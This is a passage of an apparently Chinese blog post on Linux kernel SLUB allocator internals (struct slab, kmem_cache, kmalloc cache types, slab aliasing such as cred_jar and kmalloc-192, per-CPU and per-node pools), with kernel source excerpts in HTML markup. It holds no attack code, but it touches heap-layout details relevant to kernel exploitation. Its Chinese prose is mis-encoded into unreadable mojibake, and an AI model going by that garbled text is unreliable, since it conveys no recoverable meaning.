class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> inuse:<span class="hljs-number">16</span>;<br><span class="hljs-type">unsigned</span> objects:<span class="hljs-number">15</span>;<br><span class="hljs-type">unsigned</span> frozen:<span class="hljs-number">1</span>;<br>&#125;;<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu_head</span>;</span><br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __unused;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">atomic_t</span> __page_refcount;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> memcg_data;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>slab_cache</code> ï¼šè¯¥ slab å¯¹åº”çš„å†…å­˜æ± </li><li><code>freelist</code> ï¼š<strong>Slab ä¸Šçš„ç©ºé—²å¯¹è±¡ç»„ç»‡ä¸ºä¸€ä¸ª NULL ç»“å°¾çš„å•å‘é“¾è¡¨</strong>ï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡ï¼Œè€—å°½æ—¶ä¸º NULL</li><li><code>slab_list</code> ï¼šæŒ‰ç”¨é€”è¿æ¥å¤šä¸ª slabs çš„åŒå‘é“¾è¡¨</li><li><code>inuse</code> ï¼šå·²è¢«ä½¿ç”¨çš„å¯¹è±¡æ•°é‡</li><li><code>objects</code>ï¼šè¯¥ slab ä¸Šçš„å¯¹è±¡æ€»æ•°</li><li><code>frozen</code>ï¼šæ˜¯å¦è¢«å†»ç»“ï¼Œå³<strong>å·²ç»å½’å±äºç‰¹å®šçš„ CPU</strong></li></ul><blockquote><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ <strong>counters æˆå‘˜ç›´æ¥æ¶µç›–äº† inuse &amp; objects &amp; frozen</strong>ï¼Œåé¢ä¼šæœ‰å¤§é‡çš„ç›´æ¥é€šè¿‡ counters æˆå‘˜è¿›è¡Œèµ‹å€¼çš„æ“ä½œï¼Œ<strong>å®é™…ä¸Šå°±æ˜¯èµ‹å€¼äº† inuse &amp; objects &amp; frozen</strong></p></blockquote><p>æ­£å¦‚ä¸€ä¸ª page ç»“æ„ä½“ç›´æ¥å¯¹åº”ä¸€å¼ å†…å­˜é¡µï¼ˆæˆ–å¤åˆé¡µï¼‰ï¼Œå¤ç”¨äº† page ç»“æ„ä½“çš„ slab ä¹Ÿ<strong>ç›´æ¥å¯¹åº”ä¸€ä»½ slab å†…å­˜é¡µ</strong>ï¼Œå€ŸåŠ© <code>page_to_pfn()</code> ç­‰å‡½æ•°å¯ä»¥ç›´æ¥å®Œæˆ slab ç»“æ„ä½“åˆ°å¯¹åº”å†…å­˜é¡µè™šæ‹Ÿåœ°å€çš„è½¬æ¢ï¼Œåä¹‹äº¦ç„¶ï¼Œå³<strong>æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ä¸€ä¸ªç©ºé—²å¯¹è±¡çš„è™šæ‹Ÿåœ°å€æ‰¾åˆ°å¯¹åº”çš„ slab ç»“æ„ä½“</strong></p><p><img src="https://s2.loli.net/2023/02/21/cBXCGF4Z18VLMzl.png" alt="image.png"></p><h2 id="äºŒã€kmem-cacheï¼šç‰¹å®šå¤§å°-amp-ç”¨é€”å¯¹è±¡ï¼ˆå †å—ï¼‰çš„å†…å­˜æ± "><a href="#äºŒã€kmem-cacheï¼šç‰¹å®šå¤§å°-amp-ç”¨é€”å¯¹è±¡ï¼ˆå †å—ï¼‰çš„å†…å­˜æ± " class="headerlink" title="äºŒã€kmem_cacheï¼šç‰¹å®šå¤§å°&amp;ç”¨é€”å¯¹è±¡ï¼ˆå †å—ï¼‰çš„å†…å­˜æ± "></a>äºŒã€kmem_cacheï¼šç‰¹å®šå¤§å°&amp;ç”¨é€”å¯¹è±¡ï¼ˆå †å—ï¼‰çš„å†…å­˜æ± </h2><p><code>kmem_cache</code> ä¸ºä¸€ä¸ªåŸºæœ¬çš„ allocator ç»„ä»¶ï¼Œå¯ä»¥ç†è§£ä¸º <strong>ç”¨äºåˆ†é…æŸä¸ªç‰¹å®šå¤§å°ï¼ˆæŸç§ç‰¹å®šç”¨é€”ï¼‰çš„å¯¹è±¡çš„å†…å­˜æ± </strong>ï¼Œæ‰€æœ‰çš„ kmem_cache æ„æˆä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå¹¶å­˜åœ¨ä¸€ä¸ªå¯¹åº”çš„é€šç”¨ <code>kmem_cache</code> æ•°ç»„ <code>kmalloc_caches</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *</span><br><span class="hljs-class"><span class="hljs-title">kmalloc_caches</span>[<span class="hljs-title">NR_KMALLOC_TYPES</span>][<span class="hljs-title">KMALLOC_SHIFT_HIGH</span> + 1] __<span class="hljs-title">ro_after_init</span> =</span><br>&#123; <span class="hljs-comment">/* initialization for https://bugs.llvm.org/show_bug.cgi?id=42570 */</span> &#125;;<br>EXPORT_SYMBOL(kmalloc_caches);<br></code></pre></td></tr></table></figure><blockquote><p>è€ç‰ˆæœ¬è¿˜æœ‰ä¸ª dma ä¸“ç”¨æ•°ç»„ <code>kmalloc_dma_caches</code> ï¼Œåœ¨ <a href="https://patchwork.kernel.org/project/linux-mm/patch/20180718133620.6205-2-vbabka@suse.cz/">è¿™ä¸ª commit</a> ç»™åˆå¹¶èµ·æ¥äº†</p></blockquote><h3 id="I-åŸºæœ¬ç»“æ„"><a href="#I-åŸºæœ¬ç»“æ„" class="headerlink" title="I. åŸºæœ¬ç»“æ„"></a>I. åŸºæœ¬ç»“æ„</h3><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>include/linux/slub_def.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab ç¼“å­˜ç®¡ç†.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLUB_TINY</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">cpu_slab</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">/* ç”¨äºå–å› partial slabs ç­‰. */</span><br><span class="hljs-type">slab_flags_t</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> min_partial;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<span class="hljs-comment">/* ä¸€ä¸ªå¯¹è±¡åŒ…å«å…ƒæ•°æ®çš„å¤§å° */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> object_size;<span class="hljs-comment">/* ä¸€ä¸ªå¯¹è±¡ä¸åŒ…å«å…ƒæ•°æ®çš„å¤§å° */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reciprocal_value</span> <span class="hljs-title">reciprocal_size</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset;<span class="hljs-comment">/* ç©ºé—²æŒ‡é’ˆçš„åç§» */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-comment">/* è¦ä¿ç•™çš„ per cpu partial å¯¹è±¡æ•°é‡ */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial;<br><span class="hljs-comment">/* è¦ä¿ç•™çš„ per cpu partial slub æ•°é‡ */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial_slabs;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span>;</span><br><br><span class="hljs-comment">/* åˆ†é…ä¸é‡Šæ”¾ slabs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">min</span>;</span><br><span class="hljs-type">gfp_t</span> allocflags;<span class="hljs-comment">/* ï¼ˆè¯‘æ³¨ï¼šå‘ buddy systemï¼‰åˆ†é…æ—¶æ‰€ç”¨çš„ gfp æ ‡å¿—ä½ */</span><br><span class="hljs-type">int</span> refcount;<span class="hljs-comment">/* ç”¨äº slab ç¼“å­˜é”€æ¯çš„å¼•ç”¨è®¡æ•° */</span><br><span class="hljs-type">void</span> (*ctor)(<span class="hljs-type">void</span> *);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inuse;<span class="hljs-comment">/* å…ƒæ•°æ®çš„åç§» */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> align;<span class="hljs-comment">/* å¯¹é½ */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> red_left_pad;<span class="hljs-comment">/* Left redzone padding size */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<span class="hljs-comment">/* Name (only for display!) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><span class="hljs-comment">/* slab ç¼“å­˜é“¾è¡¨ */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SYSFS</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kobject</span> <span class="hljs-title">kobj</span>;</span><span class="hljs-comment">/* For sysfs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> random;<span class="hljs-comment">// ç”¨äºåŠ å¯† freelist æŒ‡é’ˆçš„éšæœºå€¼</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NUMA</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é€šè¿‡ä»ä¸€ä¸ª remote node åˆ†é…ä»¥å»ç¢ç‰‡åŒ–.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> remote_node_defrag_ratio;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *random_seq;<span class="hljs-comment">// ç”¨äºåœ¨åˆå§‹åŒ–æ—¶éšæœºåŒ– freelist</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KASAN</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kasan_cache</span> <span class="hljs-title">kasan_info</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> useroffset;<span class="hljs-comment">/* ç”¨æˆ·æ‹·è´åŒºåŸŸçš„åç§» */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> usersize;<span class="hljs-comment">/* ç”¨æˆ·æ‹·è´åŒºåŸŸçš„å¤§å° */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">node</span>[<span class="hljs-title">MAX_NUMNODES</span>];</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><code>cpu_slab</code>ï¼š <em>percpu å˜é‡</em> ï¼ŒæŒ‡å‘ä¸€ä¸ª <code>kmem_cache_cpu</code> ç»“æ„ä½“ï¼Œå³<strong>å½“å‰ CPU ç‹¬å çš„å†…å­˜æ± </strong></p></li><li><p><code>flags</code>ï¼šæ ‡å¿—ä½</p></li><li><p><code>min_partial</code>ï¼šnode partial é“¾è¡¨ä¸Š slab çš„<strong>æœ€å¤§æ•°é‡</strong>ï¼ˆğŸ‘´ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦å«minï¼Œä½†å®é™…åˆ¤å®šå‘æŒ¥çš„æ˜¯maxçš„ä½œç”¨ï¼‰</p></li><li><p><code>cpu_partial_slabs</code>ï¼šcpu partial é“¾è¡¨ä¸Š  slab çš„<strong>æœ€å¤§æ•°é‡</strong></p></li><li><p><code>cpu_partial</code>ï¼šper cpu partial list ä¸­æœ€å¤šçš„å¯¹è±¡æ•°é‡ï¼ˆä½†å¥½è±¡æ˜¯æ²¡å•¥ç”¨ï¼‰</p></li><li><p><code>size</code>ï¼šä¸€ä¸ªå¯¹è±¡çš„å®é™…å¤§å°</p></li><li><p><code>object_size</code>ï¼šä¸€ä¸ªå¯¹è±¡æ‰€ç”¨æ•°æ®çš„å¤§å°</p><blockquote><p>ä¾‹å¦‚ <code>struct cred</code> å¤§å°ä¸º 176ï¼ˆobject_sizeï¼‰ï¼Œå®é™…åˆ†é…çš„å¯¹è±¡å¤§å°ä¸º 192 ï¼ˆsizeï¼‰</p></blockquote></li><li><p><code>offset</code>ï¼šslab ä¸Šç©ºé—²å¯¹è±¡é“¾è¡¨æŒ‡é’ˆåœ¨å¯¹è±¡ä¸Šçš„åç§»</p></li><li><p><code>oo</code> ï¼š <em>å…¶å®å°±æ˜¯ä¸€ä¸ª int</em> </p><ul><li>ä½ 16 ä½ï¼šä¸€å¼  slab ä¸Šçš„å¯¹è±¡æ•°é‡</li><li>é«˜ 16 ä½ï¼šä¸€å¼  slab çš„å¤§å°ï¼ˆ2<sup>n</sup> å¼ å†…å­˜é¡µï¼‰</li></ul></li><li><p><code>min</code>ï¼šä¸€å¼  slab ä¸Šæœ€å°‘çš„å¯¹è±¡æ•°é‡</p></li><li><p><code>allocflags</code>ï¼šå‘ buddy system è¯·æ±‚é¡µé¢æ—¶æ‰€ç”¨çš„ gfp flag</p></li><li><p><code>ctor</code>ï¼šå¯¹è±¡çš„æ„é€ å‡½æ•°ï¼Œåœ¨åˆ†é…å¯¹è±¡åä¼šè°ƒç”¨è¯¥å‡½æ•°è¿›è¡Œåˆå§‹åŒ–</p></li><li><p><code>inuse</code>ï¼šå®é™…ä¸Šå°±æ˜¯ <code>object_size</code></p></li><li><p><code>align</code>ï¼šå¯¹è±¡å¯¹é½çš„å®½åº¦</p></li><li><p>Randomed freelist ä¿æŠ¤ç›¸å…³ï¼š</p><ul><li><code>random_seq</code> ï¼šç”¨äºåœ¨ slab åˆå§‹åŒ–æ—¶éšæœºåŒ– freelist ä¸Šç©ºé—²å¯¹è±¡çš„è¿æ¥é¡ºåº</li></ul></li><li><p>Hardened Usercopy ä¿æŠ¤ç›¸å…³</p><ul><li><code>useroffset</code>ï¼šç”¨æˆ·ç©ºé—´èƒ½è¯»å†™åŒºåŸŸçš„èµ·å§‹åç§»</li><li><code>usersize</code>ï¼šç”¨æˆ·ç©ºé—´èƒ½è¯»å†™åŒºåŸŸçš„å¤§å°</li></ul></li><li><p><code>node</code>ï¼šä¸€ä¸ª <code>kmem_cache_node</code> æ•°ç»„ï¼Œå¯¹åº”å¤šä¸ª<strong>ä¸åŒ node çš„åå¤‡å†…å­˜æ± </strong></p></li></ul><p><img src="https://s2.loli.net/2023/02/21/D4idvgzLAaqIBQM.png" alt="image.png"></p><h3 id="II-ç±»å‹"><a href="#II-ç±»å‹" class="headerlink" title="II. ç±»å‹"></a>II. ç±»å‹</h3><p>åˆå§‹æ—¶ä¸€å…±æœ‰å¦‚ä¸‹å‡ ç§ç±»å‹çš„ <code>kmem_cache</code>ï¼Œåœ¨è¿›è¡Œå†…å­˜åˆ†é…æ—¶è‹¥æœªæŒ‡å®šå†…å­˜æ± åˆ™ä¼šæ ¹æ®å¯¹åº”çš„ flag ä»ä¸åŒçš„ <code>kmem_cache</code> ä¸­å–ï¼š</p><ul><li><code>KMALLOC_NORMAL</code> ï¼šé€šç”¨ç±»å‹å†…å­˜æ± ï¼Œå¯¹åº” <code>kmalloc-*</code>ï¼Œå¯¹åº”åˆ†é… flag ä¸º <code>GFP_KERNEL</code></li><li><code>KMALLOC_DMA</code>ï¼šç”¨äº DMA çš„å†…å­˜æ± ï¼Œå¯¹åº” <code>kmalloc-dma-*</code></li><li><code>KMALLOC_RECLAIM</code> å¯ä»¥è¢«å›æ”¶çš„å†…å­˜æ± ï¼Œå¯¹åº” <code>kmalloc-rcl-*</code></li><li><code>KMALLOC_CGROUP</code> ï¼šç”¨äºéœ€è¦è¿›è¡Œæ•°é‡ç»Ÿè®¡ï¼ˆ<code>accounted</code>ï¼Œä¸»è¦ç”¨äº CGROUP ç›¸å…³ï¼‰çš„å†…å­˜æ± ï¼Œå¯¹åº” <code>kmalloc-cg-*</code> ï¼Œå¯¹åº”åˆ†é… flag ä¸º <code>GFP_KERNEL_ACCOUNT</code></li></ul><p>è‹¥æ˜¯æœªå¼€å¯å¯¹åº”çš„ç¼–è¯‘é€‰é¡¹ï¼Œåˆ™é»˜è®¤åˆå¹¶å…¥ <code>KMALLOC_NORMAL</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Whenever changing this, take care of that kmalloc_type() and</span><br><span class="hljs-comment"> * create_kmalloc_caches() still work as intended.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * KMALLOC_NORMAL can contain only unaccounted objects whereas KMALLOC_CGROUP</span><br><span class="hljs-comment"> * is for accounted but unreclaimable and non-dma objects. All the other</span><br><span class="hljs-comment"> * kmem caches can have both accounted and unaccounted objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">kmalloc_cache_type</span> &#123;</span><br>KMALLOC_NORMAL = <span class="hljs-number">0</span>,<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_TINY</span><br>KMALLOC_RECLAIM = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>KMALLOC_RECLAIM,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>NR_KMALLOC_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="III-slab-aliasï¼ˆmergeabilityï¼‰"><a href="#III-slab-aliasï¼ˆmergeabilityï¼‰" class="headerlink" title="III. slab aliasï¼ˆmergeabilityï¼‰"></a>III. slab aliasï¼ˆmergeabilityï¼‰</h3><p>slab alias æœºåˆ¶æ˜¯ä¸€ç§å¯¹åŒç­‰&#x2F;ç›¸è¿‘å¤§å° object çš„ <code>kmem_cache</code> è¿›è¡Œ<strong>å¤ç”¨</strong>çš„ä¸€ç§æœºåˆ¶ï¼š</p><ul><li>å½“ä¸€ä¸ª <code>kmem_cache</code> åœ¨åˆ›å»ºæ—¶ï¼Œè‹¥å·²ç»å­˜åœ¨èƒ½åˆ†é…ç›¸ç­‰&#x2F;è¿‘ä¼¼å¤§å°çš„ object çš„ <code>kmem_cache</code> ï¼Œåˆ™<strong>ä¸ä¼šåˆ›å»ºæ–°çš„ kmem_cacheï¼Œè€Œæ˜¯ä¸ºåŸæœ‰çš„ kmem_cache èµ·ä¸€ä¸ª aliasï¼Œä½œä¸ºâ€œæ–°çš„â€ kmem_cache è¿”å›</strong></li></ul><blockquote><p>ä¸¾ä¸ªğŸŒ°ï¼Œ<code>cred_jar</code> æ˜¯ä¸“é—¨ç”¨ä»¥åˆ†é… <code>cred</code> ç»“æ„ä½“çš„ <code>kmem_cache</code>ï¼Œåœ¨ Linux 4.4 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œå…¶ä¸º <code>kmalloc-192</code> çš„ aliasï¼Œå³ cred ç»“æ„ä½“ä¸å…¶ä»–çš„ 192 å¤§å°çš„ object éƒ½ä¼šä»åŒä¸€ä¸ª <code>kmem_cache</code>â€”â€”<code>kmalloc-192</code> ä¸­åˆ†é…</p></blockquote><p>å¯¹äºåˆå§‹åŒ–æ—¶è®¾ç½®äº† <code>SLAB_ACCOUNT</code> è¿™ä¸€ flag çš„ <code>kmem_cache</code> è€Œè¨€ï¼Œåˆ™ä¼šæ–°å»ºä¸€ä¸ªæ–°çš„ <code>kmem_cache</code> è€Œéä¸ºåŸæœ‰çš„å»ºç«‹ aliasï¼ŒğŸŒ°å¦‚åœ¨æ–°ç‰ˆçš„å†…æ ¸å½“ä¸­ <code>cred_jar</code> ä¸ <code>kmalloc-192</code> ä¾¿æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„ <code>kmem_cache</code>ï¼Œ<strong>å½¼æ­¤ä¹‹é—´äº’ä¸å¹²æ‰°</strong></p><h2 id="ä¸‰ã€kmem-cache-cpuï¼šå„-CPU-ç‹¬å å†…å­˜æ± "><a href="#ä¸‰ã€kmem-cache-cpuï¼šå„-CPU-ç‹¬å å†…å­˜æ± " class="headerlink" title="ä¸‰ã€kmem_cache_cpuï¼šå„ CPU ç‹¬å å†…å­˜æ± "></a>ä¸‰ã€kmem_cache_cpuï¼šå„ CPU ç‹¬å å†…å­˜æ± </h2><p>å½“è¿›ç¨‹å‘ slab allocator è¯·æ±‚å†…å­˜åˆ†é…æ—¶ï¼Œé¦–å…ˆä¼šå°è¯•ä»å½“å‰ CPU çš„ç‹¬å å†…å­˜æ± è¿›è¡Œåˆ†é… â€”â€”<code>kmem_cache_cpu</code> ç»“æ„ä½“è¡¨ç¤º<strong>æ¯ä¸ª CPU ç‹¬å çš„å†…å­˜æ± </strong>ï¼Œå…¶åœ¨ <code>kmem_cache</code> ä¸­ä¸ºä¸€ä¸ª percpu å˜é‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When changing the layout, make sure freelist and tid are still compatible</span><br><span class="hljs-comment"> * with this_cpu_cmpxchg_double() alignment requirements.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> &#123;</span><br><span class="hljs-type">void</span> **freelist;<span class="hljs-comment">/* æŒ‡å‘ä¸‹ä¸€ä¸ªå¯ç”¨å¯¹è±¡çš„æŒ‡é’ˆ */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<span class="hljs-comment">/* Globally unique transaction id */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><span class="hljs-comment">/* ç”¨ä»¥å†…å­˜åˆ†é…çš„ slab */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">partial</span>;</span><span class="hljs-comment">/* Partially allocated frozen slabs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">local_lock_t</span> lock;<span class="hljs-comment">/* Protects the fields above */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_STATS</span><br><span class="hljs-type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>freelist</code>ï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²å¯¹è±¡çš„æŒ‡é’ˆ</li><li><code>slab</code>ï¼šå½“å‰ç”¨ä»¥è¿›è¡Œå†…å­˜åˆ†é…çš„ slab</li><li><code>partial</code>ï¼špercpu partial slab é“¾è¡¨ï¼Œé“¾è¡¨ä¸Šä¸ºä»æœ‰ä¸€å®šç©ºé—²å¯¹è±¡çš„ slab</li></ul><p>slab çš„ freelist ä»…å½“å…¶åœ¨ partial é“¾è¡¨ä¸Šæ—¶æœ‰ç”¨ï¼Œå½“ä¸€å¼  slab ä¸ºå½“å‰ CPU æ­£åœ¨ä½¿ç”¨çš„ slab æ—¶ï¼Œå…¶ freelist ä¸º NULLï¼Œç”± <code>kmem_cache_cpu.freelist</code> æŒ‡å‘ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡</p><p><img src="https://s2.loli.net/2023/02/21/xSLqghNZ23nCMiz.png" alt="image.png"></p><h2 id="å››ã€kmem-cache-nodeï¼šå„-node-åå¤‡å†…å­˜æ± "><a href="#å››ã€kmem-cache-nodeï¼šå„-node-åå¤‡å†…å­˜æ± " class="headerlink" title="å››ã€kmem_cache_nodeï¼šå„ node åå¤‡å†…å­˜æ± "></a>å››ã€kmem_cache_nodeï¼šå„ node åå¤‡å†…å­˜æ± </h2><p><strong>æ¯ä¸ª <a href="https://arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#0x03-struct-pglist-data%EF%BC%9A%E8%8A%82%E7%82%B9">node</a> å¯¹åº”çš„åå¤‡å†…å­˜æ± </strong>ï¼Œå½“ percpu çš„ç‹¬å å†…å­˜æ± è€—å°½åä¾¿ä¼šä»å¯¹åº” node çš„åå¤‡å†…å­˜æ± å°è¯•åˆ†é…</p><blockquote><p>ä¸è¿‡å¤§éƒ¨åˆ†è®¡ç®—æœºéƒ½ä»…æœ‰ä¸€ä¸ª nodeï¼Œæ‰€ä»¥é€šå¸¸æƒ…å†µä¸‹æ¯ä¸ª <code>kmem_cache</code> ä¹Ÿå°±åªæœ‰ä¸€ä¸ª <code>kmem_cache_node</code>  